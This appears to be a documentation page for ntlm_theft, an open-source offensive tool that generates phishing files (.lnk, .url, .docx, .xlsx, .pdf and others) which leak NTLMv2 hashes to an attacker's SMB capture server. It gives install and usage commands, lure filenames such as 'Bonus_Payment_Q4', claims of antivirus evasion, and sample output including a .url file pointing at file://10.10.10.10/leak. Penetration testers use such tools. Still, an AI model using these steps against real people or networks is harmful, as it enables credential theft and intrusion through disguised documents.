---
title : "ntlm_theft"
# pre : ' '
description : "A tool for generating multiple types of NTLMv2 hash theft files."
date : 2022-09-19T08:41:52+02:00
# hidden : true
# draft : true
weight : 1230
# tags : ['']
---

---

A tool for generating multiple types of NTLMv2 hash theft files.

`ntlm_theft` is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.

The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.  

`ntlm_theft` supports the following attack types:

- Browse to Folder Containing
  - .url – via URL field
  - .url – via ICONFILE field
  - .lnk - via icon_location field
  - .scf – via ICONFILE field (Not Working on Latest Windows)
  - autorun.inf via OPEN field (Not Working on Latest Windows)
  - desktop.ini - via IconResource field (Not Working on Latest Windows)
- Open Document
  - .xml – via Microsoft Word external stylesheet
  - .xml – via Microsoft Word includepicture field
  - .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
  - .docx – via Microsoft Word includepicture field
  - .docx – via Microsoft Word external template
  - .docx – via Microsoft Word frameset webSettings
  - .xlsx - via Microsoft Excel external cell
  - .wax - via Windows Media Player playlist (Better, primary open)
  - .asx – via Windows Media Player playlist (Better, primary open)
  - .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
  - .jnlp – via Java external jar
  - .application – via any Browser (Must be served via a browser downloaded or won’t run)
- Open Document and Accept Popup
  - .pdf – via Adobe Acrobat Reader
- Click Link in Chat Program
  - .txt – formatted link to paste into Zoom chat

## Installation

```plain
git clone https://github.com/Greenwolf/ntlm_theft.git
python3 -m pip install xlsxwriter
```

## Usage

```plain
ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
```

## Flags

```plain
ntlm_theft by Jacob Wilkin(Greenwolf)

options:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -vv, --verbose        Verbose Mode
  -g {scf,xlsx,docx,jnlp,zoom,autoruninf,rtf,m3u,desktopini,lnk,wax,application,htm,all,url,pdf,xml,modern,asx}, --generate {scf,xlsx,docx,jnlp,zoom,autoruninf,rtf,m3u,desktopini,lnk,wax,application,htm,all,url,pdf,xml,modern,asx}
                        Choose to generate all files or a specific filetype
  -s SERVER, --server SERVER
                        The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)
  -f FILENAME, --filename FILENAME
                        The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)
```

Required parameters.

```plain
-g, --generate  : Choose to generate all files or a specific filetype
-s, --server    : The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)
-f, --filename  : The base filename without extension, can be renamed later (eg: test, Board-Meeting2020, Bonus_Payment_Q4)
```

## Examples

### Create LNK file(s)

```plain
$ python3 ntlm_theft.py -g lnk -s 10.10.10.10 -f generated-file    
Created: generated-file/generated-file.lnk (BROWSE TO FOLDER)
Generation Complete.
```

### Create URL file(s)

```plain
$ python3 ntlm_theft.py -g url -s 10.10.10.10 -f generated-url  
Created: generated-url/generated-url-(url).url (BROWSE TO FOLDER)
Created: generated-url/generated-url-(icon).url (BROWSE TO FOLDER)
Generation Complete.

$ cat generated-url/generated-url-\(url\).url 
[InternetShortcut]
URL=file://10.10.10.10/leak/leak.html
```

## URL List

- [Github.com - ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
